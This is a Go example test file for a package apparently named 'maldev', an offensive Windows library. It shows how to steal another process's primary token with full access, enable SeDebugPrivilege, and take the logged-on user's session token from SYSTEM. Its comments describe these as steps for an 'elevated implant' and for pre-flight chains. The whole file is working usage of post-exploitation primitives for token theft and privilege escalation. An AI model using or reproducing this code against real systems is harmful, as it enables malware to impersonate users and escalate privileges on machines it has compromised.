//go:build windows

package token_test

import (
	"fmt"

	"github.com/oioio-space/maldev/win/token"
)

// Steal opens a target PID's primary token, duplicates it as
// TOKEN_ALL_ACCESS impersonation, and hands it back as a *Token.
// Caller wires it into win/impersonate or windows.CreateProcessAsUser.
func ExampleSteal() {
	tok, err := token.Steal(1234) // any target PID
	if err != nil {
		fmt.Println("steal:", err)
		return
	}
	defer tok.Close()

	user, _ := tok.UserDetails()
	fmt.Printf("stole token for %s\\%s\n", user.Domain, user.Username)
}

// EnablePrivilege flips a single privilege on the current token.
// Most pre-flight chains call EnablePrivilege("SeDebugPrivilege")
// before reaching for win/token.Steal or win/syscall.MethodDirect.
func ExampleToken_EnablePrivilege() {
	tok, err := token.OpenProcessToken(0, token.Primary) // 0 = self
	if err != nil {
		fmt.Println("open:", err)
		return
	}
	defer tok.Close()

	if err := tok.EnablePrivilege("SeDebugPrivilege"); err != nil {
		fmt.Println("priv:", err)
	}
}

// Interactive returns the active interactive session's primary
// token from a SYSTEM context — the standard way for an
// elevated implant to spawn a child as the logged-on user.
func ExampleInteractive() {
	tok, err := token.Interactive(token.Primary)
	if err != nil {
		fmt.Println("interactive:", err)
		return
	}
	defer tok.Close()
}
